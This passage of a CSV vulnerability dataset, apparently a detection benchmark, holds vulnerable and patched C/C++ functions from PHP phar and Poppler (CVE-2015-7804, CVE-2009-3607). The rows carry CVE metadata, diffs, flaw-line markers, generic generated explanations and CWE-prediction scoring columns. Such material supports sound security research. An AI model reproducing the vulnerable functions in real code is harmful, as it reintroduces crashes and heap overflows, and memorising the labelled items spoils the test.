,Unnamed: 0.2,Unnamed: 0.1,Unnamed: 0,Access Gained,Attack Origin,Authentication Required,Availability,CVE ID,CVE Page,CWE ID,Complexity,Confidentiality,Integrity,Known Exploits,Publish Date,Score,Summary,Update Date,Vulnerability Classification,add_lines,codeLink,commit_id,commit_message,del_lines,file_name,files_changed,func_after,func_before,lang,lines_after,lines_before,parentID,patch,project,project_after,project_before,vul,vul_func_with_fix,idx,primevul_func_before_fix,primevul_func_after_fix,C1_Description_of_Functionality_In_Context,C2_Description_of_Functionality_Generic,C3_Explanation_of_Vulnerability_In_Context,C4_Explanation_of_Vulnerability_Generic,C5_Explanation_Vulnerability_Fixed_In_Context,C6_Explanation_Vulnerability_Fixed_Generic,T1_Top_10_CWE_IDs,T2_Correctly_Found_CWE,T3_IFA
               if (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {
                        break;
                }
 
		PHAR_STR(key, str_key);

		if (keylen <= (uint)dirlen) {
			if (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {
				PHAR_STR_FREE(str_key);
				if (SUCCESS != zend_hash_move_forward(manifest)) {
					break;
				}
				continue;
			}
		}

		if (*dir == '/') {
			/* root directory */
			if (keylen >= sizeof("".phar"")-1 && !memcmp(str_key, "".phar"", sizeof("".phar"")-1)) {
				PHAR_STR_FREE(str_key);
				/* do not add any magic entries to this directory */
				if (SUCCESS != zend_hash_move_forward(manifest)) {
					break;
				}
				continue;
			}

			if (NULL != (found = (char *) memchr(str_key, '/', keylen))) {
				/* the entry has a path separator and is a subdirectory */
				entry = (char *) safe_emalloc(found - str_key, 1, 1);
				memcpy(entry, str_key, found - str_key);
				keylen = found - str_key;
				entry[keylen] = '\0';
			} else {
				entry = (char *) safe_emalloc(keylen, 1, 1);
				memcpy(entry, str_key, keylen);
				entry[keylen] = '\0';
			}

			PHAR_STR_FREE(str_key);
			goto PHAR_ADD_ENTRY;
		} else {
			if (0 != memcmp(str_key, dir, dirlen)) {
				/* entry in directory not found */
				PHAR_STR_FREE(str_key);
				if (SUCCESS != zend_hash_move_forward(manifest)) {
					break;
				}
				continue;
			} else {
				if (str_key[dirlen] != '/') {
					PHAR_STR_FREE(str_key);
					if (SUCCESS != zend_hash_move_forward(manifest)) {
						break;
					}
					continue;
				}
			}
		}

		save = str_key;
		save += dirlen + 1; /* seek to just past the path separator */

		if (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {
			/* is subdirectory */
			save -= dirlen + 1;
			entry = (char *) safe_emalloc(found - save + dirlen, 1, 1);
			memcpy(entry, save + dirlen + 1, found - save - dirlen - 1);
			keylen = found - save - dirlen - 1;
			entry[keylen] = '\0';
		} else {
			/* is file */
			save -= dirlen + 1;
			entry = (char *) safe_emalloc(keylen - dirlen, 1, 1);
			memcpy(entry, save + dirlen + 1, keylen - dirlen - 1);
			entry[keylen - dirlen - 1] = '\0';
			keylen = keylen - dirlen - 1;
		}
		PHAR_STR_FREE(str_key);
PHAR_ADD_ENTRY:
		if (keylen) {
			phar_add_empty(data, entry, keylen);
		}

		efree(entry);

		if (SUCCESS != zend_hash_move_forward(manifest)) {
			break;
		}
	}

	if (FAILURE != zend_hash_has_more_elements(data)) {
		efree(dir);
		if (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {
			FREE_HASHTABLE(data);
			return NULL;
		}
		return php_stream_alloc(&phar_dir_ops, data, NULL, ""r"");
	} else {
		efree(dir);
		return php_stream_alloc(&phar_dir_ops, data, NULL, ""r"");
	}
}
/* }}}*/
","The provided code defines a function `phar_make_dirstream` that creates a directory stream for a specified directory within a PHP Archive (PHAR). It initializes a hash table to store directory entries and checks if the directory is empty or a special "".phar"" directory. The function iterates through a manifest of entries, filtering and adding relevant entries to the hash table based on their paths. It handles both files and subdirectories, ensuring that only appropriate entries are included. Finally, it sorts the entries and returns a stream representing the directory, or an empty stream if no entries are found.","The code defines a function that generates a directory stream for a specified directory within a PHP Archive. It initializes a data structure to hold directory entries and checks for special cases, such as empty directories or specific magic directories. The function iterates through a collection of entries, filtering and adding relevant ones based on their paths, while distinguishing between files and subdirectories. After processing the entries, it sorts them and returns a stream representing the directory, or an empty stream if no valid entries are found, ensuring proper handling of directory structures within the archive.","The vulnerability in the original code stemmed from improper handling of non-existent keys in the manifest, which could lead to unexpected behavior or crashes. Specifically, the check for the current key was inadequate, allowing the function to proceed with invalid or non-existent keys, potentially causing memory access violations. The fix introduced a condition that checks for `HASH_KEY_NON_EXISTENT` when retrieving the current key, ensuring that the function exits gracefully if the key does not exist. This change enhances the robustness of the code by preventing operations on invalid keys, thereby mitigating potential security risks.","The vulnerability in the original code arose from inadequate checks for the existence of keys in a collection, which could lead to operations on invalid or non-existent entries. This oversight risked causing memory access violations or crashes, as the code could attempt to process data that wasn't properly validated. The fix implemented a more robust condition to verify the existence of keys before proceeding with further operations. This enhancement ensures that the function exits safely when encountering non-existent keys, thereby improving the overall stability and security of the code by preventing unintended behavior.","The vulnerability was fixed by adding a check for `HASH_KEY_NON_EXISTENT` when retrieving the current key from the manifest. This change ensures that the function verifies the existence of a key before proceeding with any operations. If the key does not exist, the function breaks out of the loop, preventing any further processing of invalid entries. Additionally, this fix enhances the overall robustness of the code by ensuring that only valid keys are handled, thereby mitigating the risk of memory access violations or crashes that could occur from operating on non-existent keys.","The vulnerability was addressed by implementing a more stringent check for the existence of keys within the collection before any operations were performed. This enhancement ensures that the function can safely exit if it encounters a non-existent key, thereby preventing any attempts to process invalid data. By validating the keys upfront, the code avoids potential memory access violations and crashes that could arise from operating on invalid entries. This fix significantly improves the stability and security of the function, ensuring that only valid and existing keys are processed throughout its execution.","CWE-476, CWE-824, CWE-465, CWE-119, CWE-754, CWE-125, CWE-457, CWE-456, CWE-908, CWE-909",N,-1
2,2,177744,177744,,Remote,Not required,Partial,CVE-2015-7804,https://www.cvedetails.com/cve/CVE-2015-7804/,CWE-189,Medium,Partial,Partial,,2015-12-11,6.8,Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.,2016-12-07,DoS,1,https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1,1ddf72180a52d247db88ea42a3e35f824a8fbda2,,1,,,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
",C,"               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
","               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
",f98ab19dc0c978e3caaa2614579e4a61f2c317f6,"@@ -1977,7 +1977,7 @@ void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
-               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
+               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }",php,https://git.php.net/?p=php-src.git;a=blob;f=ext/phar/util.c;h=303daede45570591c74e8fbc94f0d6ebf617a529;hb=303daede45570591c74e8fbc94f0d6ebf617a529,https://git.php.net/?p=php-src.git;a=blob;f=ext/phar/util.c;h=e7decda9cde3741d0c4a9a4407a9795d45e6fdc0;hb=e7decda9cde3741d0c4a9a4407a9795d45e6fdc0,1,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
//flaw_line_below:
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
//fix_flaw_line_below:
//               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
",177744,"void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */
{
	const char *s;
 
        while ((s = zend_memrchr(filename, '/', filename_len))) {
                filename_len = s - filename;
               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {
                        break;
                }
        }
}
/* }}} */
","The provided code defines a function `phar_add_virtual_dirs` that adds virtual directory entries to a `phar_archive_data` structure based on the given `filename`. It utilizes a loop to search for the last occurrence of the '/' character in the `filename` string, effectively identifying directory paths. For each found directory, it calculates the length of the substring and attempts to add it as an empty element to the `virtual_dirs` hash table within the `phar` structure. The loop terminates if the addition fails, ensuring that only successfully added directories are retained.","The code defines a function that processes a given filename to extract and add virtual directory paths to a specified data structure. It searches for the last occurrence of a specific character in the filename, which indicates directory boundaries. For each identified directory path, the function calculates its length and attempts to insert it as an entry in a collection designed to hold these paths. The process continues until all directories are processed or an insertion fails, ensuring that only successfully added paths are included in the final collection.","The vulnerability in the original code arises from the lack of a check for an empty directory path before attempting to add it to the `virtual_dirs` collection. This oversight could lead to the insertion of an empty string as a directory, potentially causing unexpected behavior or security issues. The fixed code addresses this vulnerability by introducing a condition that checks if `filename_len` is zero before calling `zend_hash_add_empty_element`. This ensures that only valid, non-empty directory paths are added, thereby enhancing the robustness and security of the function.","The vulnerability in the original code stems from the absence of a check for empty directory paths before adding them to a collection. This oversight could allow the insertion of empty strings, leading to potential security risks or unintended behavior within the application. The revised code mitigates this issue by implementing a condition that verifies the length of the directory path before attempting to add it. This ensures that only valid, non-empty paths are processed, thereby improving the overall security and integrity of the function by preventing the addition of invalid entries.","The vulnerability was fixed by adding a condition that checks if `filename_len` is zero before calling `zend_hash_add_empty_element`. In the original code, there was no validation for the length of the directory path, which could lead to the insertion of empty strings into the `virtual_dirs` collection. The updated code introduces this check, ensuring that only non-empty directory paths are processed. By incorporating this validation, the function prevents the addition of invalid entries, thereby enhancing the security and reliability of the code while maintaining the intended functionality of adding virtual directories.","The vulnerability was addressed by implementing a validation step that checks the length of the directory path before attempting to add it to the collection. This additional condition ensures that only non-empty paths are processed, preventing the insertion of invalid entries that could lead to security issues or unexpected behavior. By incorporating this check, the revised code enhances the overall integrity and security of the function, ensuring that only valid directory paths are included in the final collection, thereby mitigating potential risks associated with empty entries.","CWE-20, CWE-116, CWE-182, CWE-74, CWE-73, CWE-99, CWE-22, CWE-23, CWE-36, CWE-641",N,-1
3,3,177773,177773,Admin,Remote,Not required,Complete,CVE-2009-3607,https://www.cvedetails.com/cve/CVE-2009-3607/,CWE-189,Medium,Complete,Complete,,2009-10-21,9.3,Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.,2017-08-16,DoS Exec Code Overflow Mem. Corr.,10,https://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706,c839b706092583f6b12ed3cc634bf5af34b7a2bb,,9,,,"create_surface_from_thumbnail_data (guchar *data,
				    gint    width,
				    gint    height,
 				    gint    rowstride)
 {
   guchar *cairo_pixels;
  gint cairo_stride;
   cairo_surface_t *surface;
   int j;
 
  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);
  if (cairo_surface_status (surface))
    return NULL;

  cairo_pixels = cairo_image_surface_get_data (surface);
  cairo_stride = cairo_image_surface_get_stride (surface);
 
   for (j = height; j; j--) {
     guchar *p = data;
     guchar *q = cairo_pixels;
     guchar *end = p + 3 * width;

     while (p < end) {
 #if G_BYTE_ORDER == G_LITTLE_ENDIAN
       q[0] = p[2];
       q[1] = p[1];
       q[2] = p[0];
#else
       q[1] = p[0];
       q[2] = p[1];
       q[3] = p[2];
#endif
      p += 3;
      q += 4;
     }
 
     data += rowstride;
    cairo_pixels += cairo_stride;
   }
 
   return surface;
}
","create_surface_from_thumbnail_data (guchar *data,
				    gint    width,
				    gint    height,
 				    gint    rowstride)
 {
   guchar *cairo_pixels;
   cairo_surface_t *surface;
  static cairo_user_data_key_t key;
   int j;
 
  cairo_pixels = (guchar *)g_malloc (4 * width * height);
  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,
						 CAIRO_FORMAT_RGB24,
						 width, height, 4 * width);
  cairo_surface_set_user_data (surface, &key,
			       cairo_pixels, (cairo_destroy_func_t)g_free);
 
   for (j = height; j; j--) {
     guchar *p = data;
     guchar *q = cairo_pixels;
     guchar *end = p + 3 * width;
     while (p < end) {
 #if G_BYTE_ORDER == G_LITTLE_ENDIAN
       q[0] = p[2];
       q[1] = p[1];
       q[2] = p[0];
#else	  
       q[1] = p[0];
       q[2] = p[1];
       q[3] = p[2];
#endif
      p += 3;
      q += 4;
     }
 
     data += rowstride;
    cairo_pixels += 4 * width;
   }
 
   return surface;
}
",CPP,"  gint cairo_stride;
  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);
  if (cairo_surface_status (surface))
    return NULL;

  cairo_pixels = cairo_image_surface_get_data (surface);
  cairo_stride = cairo_image_surface_get_stride (surface);

#else
    cairo_pixels += cairo_stride;
","  static cairo_user_data_key_t key;
  cairo_pixels = (guchar *)g_malloc (4 * width * height);
  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,
